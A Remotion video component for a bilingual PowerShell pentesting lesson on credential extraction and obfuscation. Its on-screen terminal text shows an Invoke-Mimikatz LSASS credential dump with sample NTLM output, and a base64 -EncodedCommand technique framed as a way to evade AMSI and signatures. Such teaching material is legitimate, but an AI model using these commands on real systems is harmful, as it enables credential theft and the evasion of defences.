// ── video/remotion/compositions/Ps05CredentialsObfuscation.tsx ───
// Video: pentesting II — credenciales, ofuscación y exfiltración.
// Clase 5 de Scripting/PowerShell (lección powershell-05). Guiones: voicebox-scripts/{es,en}/powershell/powershell-05-*.txt
// Versión unificada ES/EN con `lang` prop.

import React from 'react';
import { AbsoluteFill, Sequence, staticFile, useVideoConfig } from 'remotion';
import { Audio } from '@remotion/media';
import { sceneStartFrames, audioTimings, audioBase, hasAudio } from '../audioTimings';
import { THEME, MONO } from '../theme';
import { FontFace } from '../fonts';
import { RevealLine } from '../primitives/RevealLine';
import { KeyCapsule } from '../primitives/KeyCapsule';
import { TerminalWindow } from '../primitives/TerminalWindow';

const CENTERED: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  justifyContent: 'center',
  alignItems: 'center',
  height: '100%',
  textAlign: 'center',
};

const VID = 'powershell-05-credentials-obfuscation';

// ── COPY ────────────────────────────────────────────────────────────
const COPY = {
  es: {
    s1: {
      title: <>CREDENCIALES Y <span style={{ color: THEME.red }}>OFUSCACIÓN</span></>,
      subtitle: 'Acceso a memoria, extracción de credenciales y evasión de controles',
      capsuleLabel: 'credenciales en RAM',
      capsuleValue: 'viven en el proceso LSASS',
      points: ['Toca memoria, credenciales y red — el entorno más potente', 'Las contraseñas y hashes son el botín principal en Windows'],
    },
    s2: {
      title: <><span style={{ color: THEME.red }}>LSASS.EXE</span>: EXTRACCIÓN DE CREDENCIALES</>,
      terminalTitle: 'PS C:\\> Invoke-Mimikatz',
      terminalContent: [
        { parts: [{ color: 'cyan', text: 'Invoke-Mimikatz' }, { color: 'text', text: ' -Command ' }, { color: 'green', text: '"sekurlsa::logonpasswords"' }] },
        { color: 'dim', text: '# Vuelca contraseñas en claro, hashes NTLM y tickets Kerberos:' },
        { color: 'amber', text: 'Authentication Id : 0 ; 1234567' },
        { color: 'text', text: 'User Name         : Administrator' },
        { color: 'green', text: '* NTLM            : 8846f7eaee8fb117ad06bdd830b7586c' },
        { color: 'dim', text: '# Detección por AV/EDR -> variantes modernas como Rubeus' },
      ],
      capsule1: { label: 'LSASS.exe', value: 'memoria de sesión' },
      capsule2: { label: 'Invoke-Mimikatz', value: 'hashes NTLM / Kerberos' },
      capsule3: { label: 'Rubeus / EDR', value: 'variantes modernas' },
    },
    s3: {
      title: <>OFUSCACIÓN: <span style={{ color: THEME.green }}>AMSI Y -EncodedCommand</span></>,
      terminalTitle: 'PS C:\\> powershell -EncodedCommand $enc',
      terminalContent: [
        { color: 'text', text: '$cmd = "whoami /priv"' },
        { color: 'text', text: '$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)' },
        { color: 'text', text: '$enc = [Convert]::ToBase64String($bytes) ' },
        { color: 'dim', text: '# Base64 UTF-16LE' },
        { color: 'dim', text: '# Ejecutar payload ofuscado sin disparar firmas básicas:' },
        { color: 'cyan', text: 'powershell -NoProfile -EncodedCommand $enc' },
        { color: 'amber', text: 'SeDebugPrivilege            Enabled' },
      ],
      capsule1: { label: 'AMSI', value: 'escaneo de scripts' },
      capsule2: { label: '-EncodedCommand', value: 'Base64 unicode' },
      capsule3: { label: 'ScriptBlock Logging', value: 'monitoreo de logs' },
    },
  },
  en: {
    s1: {
      title: <>CREDENTIALS AND <span style={{ color: THEME.red }}>OBFUSCATION</span></>,
      subtitle: 'memory, credentials, the network — and the most watched',
      capsuleLabel: 'credentials in RAM',
      capsuleValue: 'live inside the LSASS process',
      points: ['it touches everything that needs touching — but it\'s also the most watched', "a session's credentials are loot waiting for someone to grab it"],
    },
    s2: {
      title: <><span style={{ color: THEME.red }}>LSASS.EXE</span>: CREDENTIAL EXTRACTION</>,
      terminalTitle: 'PS C:\\> Invoke-Mimikatz',
      terminalContent: [
        { parts: [{ color: 'cyan', text: 'Invoke-Mimikatz' }, { color: 'text', text: ' -Command ' }, { color: 'green', text: '"sekurlsa::logonpasswords"' }] },
        { color: 'dim', text: '# Dumps passwords in clear text, NTLM hashes and Kerberos tickets:' },
        { color: 'amber', text: 'Authentication Id : 0 ; 1234567' },
        { color: 'text', text: 'User Name         : Administrator' },
        { color: 'green', text: '* NTLM            : 8846f7eaee8fb117ad06bdd830b7586c' },
        { color: 'dim', text: '# AVs/EDRs catch Mimikatz fast -> modern attacks use variants like Rubeus' },
      ],
      capsule1: { label: 'LSASS.exe', value: 'session memory' },
      capsule2: { label: 'Invoke-Mimikatz', value: 'NTLM hashes / Kerberos' },
      capsule3: { label: 'Rubeus / EDR', value: 'modern variants' },
      extraReveal: "the concept doesn't change: a session's memory is gold",
    },
    s3: {
      title: <>OBFUSCATION: <span style={{ color: THEME.green }}>AMSI AND -EncodedCommand</span></>,
      terminalTitle: 'PS C:\\> powershell -EncodedCommand $enc',
      terminalContent: [
        { color: 'text', text: '$cmd = "whoami /priv"' },
        { color: 'text', text: '$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)' },
        { color: 'text', text: '$enc = [Convert]::ToBase64String($bytes) ' },
        { color: 'dim', text: '# Base64 UTF-16LE' },
        { color: 'dim', text: '# Run the obfuscated payload on the target:' },
        { color: 'cyan', text: 'powershell -NoProfile -EncodedCommand $enc' },
        { color: 'amber', text: 'SeDebugPrivilege            Enabled' },
      ],
      capsule1: { label: 'AMSI', value: 'scans every script' },
      capsule2: { label: '-EncodedCommand', value: 'base64 unicode' },
      capsule3: { label: 'ScriptBlock Logging', value: 'defenders strike back' },
      extraReveal: "that's why silent attackers use unmanaged tools",
    },
  },
};

// ── BEATS ───────────────────────────────────────────────────────────
const BEATS = {
  es: {
    s1: { capsuleDelay: 2.5, points: [5, 9] },
    s2: { terminalDelay: 1.5, capsule1Delay: 3.5, capsule2Delay: 8, capsule3Delay: 13 },
    s3: { terminalDelay: 1.5, capsule1Delay: 3.5, capsule2Delay: 8.5, capsule3Delay: 14 },
  },
  en: {
    s1: { capsuleDelay: 13.2, points: [4.3, 16.0] },
    s2: { terminalDelay: 3.0, capsule1Delay: 1.5, capsule2Delay: 5.5, capsule3Delay: 14.8, extraRevealAt: 19.5 },
    s3: { terminalDelay: 14.2, capsule1Delay: 3.1, capsule2Delay: 14.9, capsule3Delay: 17.5, extraRevealAt: 22.2 },
  },
};

const renderTerminal = (lines: any[]) => lines.map((line, i) => {
  if (typeof line === 'string') return <React.Fragment key={i}>{line}</React.Fragment>;
  return (
    <React.Fragment key={i}>
      {i > 0 && '\n'}
      {'parts' in line
        ? line.parts.map((p: any, j: number) => <span key={j} style={{ color: THEME[p.color as keyof typeof THEME] }}>{p.text}</span>)
        : <span style={{ color: THEME[line.color as keyof typeof THEME] }}>{line.text}</span>}
    </React.Fragment>
  );
});

// ── Scene 1 ─────────────────────────────────────────────────────────
const Scene1: React.FC<{ fps: number; c: typeof COPY.es.s1; b: typeof BEATS.es.s1 }> = ({ fps, c, b }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 32, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 18 }}>
      {c.title}
    </div>
    <div style={{ fontSize: 18, color: THEME.muted, fontFamily: MONO, marginBottom: 28 }}>
      {c.subtitle}
    </div>
    <KeyCapsule label={c.capsuleLabel} value={c.capsuleValue} accent={THEME.cyan} delay={Math.round(b.capsuleDelay * fps)} size={24} />
    <div style={{ marginTop: 24, fontSize: 17, color: THEME.muted, fontFamily: MONO, textAlign: 'left', width: 780 }}>
      {c.points.map((point, i) => (
        <React.Fragment key={i}>
          {i > 0 && <div style={{ height: 10 }} />}
          <RevealLine at={b.points[i]} fps={fps} mark="▸" color={i === 0 ? THEME.cyan : THEME.green}>{point}</RevealLine>
        </React.Fragment>
      ))}
    </div>
  </AbsoluteFill>
);

// ── Scene 2 ─────────────────────────────────────────────────────────
const Scene2: React.FC<{ fps: number; c: typeof COPY.es.s2; b: typeof BEATS.es.s2 }> = ({ fps, c, b }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 16 }}>
      {c.title}
    </div>
    <TerminalWindow title={c.terminalTitle} width={940} delay={Math.round(b.terminalDelay * fps)}>
      <div style={{ fontSize: 13, whiteSpace: 'pre', lineHeight: 1.65 }}>{renderTerminal(c.terminalContent)}</div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 12, marginTop: 18 }}>
      <KeyCapsule label={c.capsule1.label} value={c.capsule1.value} accent={THEME.red} delay={Math.round(b.capsule1Delay * fps)} size={16} />
      <KeyCapsule label={c.capsule2.label} value={c.capsule2.value} accent={THEME.amber} delay={Math.round(b.capsule2Delay * fps)} size={16} />
      <KeyCapsule label={c.capsule3.label} value={c.capsule3.value} accent={THEME.cyan} delay={Math.round(b.capsule3Delay * fps)} size={16} />
    </div>
    {'extraReveal' in c && 'extraRevealAt' in b && (
      <div style={{ marginTop: 14, fontSize: 15, color: THEME.muted, fontFamily: MONO }}>
        <RevealLine at={(b as any).extraRevealAt} fps={fps} mark="▸" color={THEME.amber}>{(c as any).extraReveal}</RevealLine>
      </div>
    )}
  </AbsoluteFill>
);

// ── Scene 3 ─────────────────────────────────────────────────────────
const Scene3: React.FC<{ fps: number; c: typeof COPY.es.s3; b: typeof BEATS.es.s3 }> = ({ fps, c, b }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 16 }}>
      {c.title}
    </div>
    <TerminalWindow title={c.terminalTitle} width={960} delay={Math.round(b.terminalDelay * fps)}>
      <div style={{ fontSize: 13, whiteSpace: 'pre', lineHeight: 1.65 }}>{renderTerminal(c.terminalContent)}</div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 12, marginTop: 18 }}>
      <KeyCapsule label={c.capsule1.label} value={c.capsule1.value} accent={THEME.red} delay={Math.round(b.capsule1Delay * fps)} size={16} />
      <KeyCapsule label={c.capsule2.label} value={c.capsule2.value} accent={THEME.green} delay={Math.round(b.capsule2Delay * fps)} size={16} />
      <KeyCapsule label={c.capsule3.label} value={c.capsule3.value} accent={THEME.amber} delay={Math.round(b.capsule3Delay * fps)} size={16} />
    </div>
    {'extraReveal' in c && 'extraRevealAt' in b && (
      <div style={{ marginTop: 14, fontSize: 15, color: THEME.muted, fontFamily: MONO }}>
        <RevealLine at={(b as any).extraRevealAt} fps={fps} mark="▸" color={THEME.cyan}>{(c as any).extraReveal}</RevealLine>
      </div>
    )}
  </AbsoluteFill>
);

// ── Componente principal ────────────────────────────────────────────
export const Ps05CredentialsObfuscation: React.FC<{ lang?: 'es' | 'en' }> = ({ lang = 'es' }) => {
  const { fps } = useVideoConfig();
  const c = COPY[lang];
  const b = BEATS[lang];

  const [s1, s2, s3] = audioTimings(VID, lang);
  const starts = sceneStartFrames(VID, fps, lang);
  const dur1 = Math.ceil(s1 * fps);
  const dur2 = Math.ceil(s2 * fps);
  const dur3 = Math.ceil(s3 * fps) + fps;
  const base = audioBase(lang);

  return (
    <AbsoluteFill style={{ background: THEME.bg, padding: 60, fontFamily: MONO }}>
      <FontFace />
      <Sequence from={starts[0]} durationInFrames={dur1}>
        {hasAudio(VID) && <Audio src={staticFile(`${base}/${VID}/powershell-05-scene1.wav`)} />}
        <Scene1 fps={fps} c={c.s1} b={b.s1} />
      </Sequence>
      <Sequence from={starts[1]} durationInFrames={dur2}>
        {hasAudio(VID) && <Audio src={staticFile(`${base}/${VID}/powershell-05-scene2.wav`)} />}
        <Scene2 fps={fps} c={c.s2} b={b.s2} />
      </Sequence>
      <Sequence from={starts[2]} durationInFrames={dur3}>
        {hasAudio(VID) && <Audio src={staticFile(`${base}/${VID}/powershell-05-scene3.wav`)} />}
        <Scene3 fps={fps} c={c.s3} b={b.s3} />
      </Sequence>
    </AbsoluteFill>
  );
};
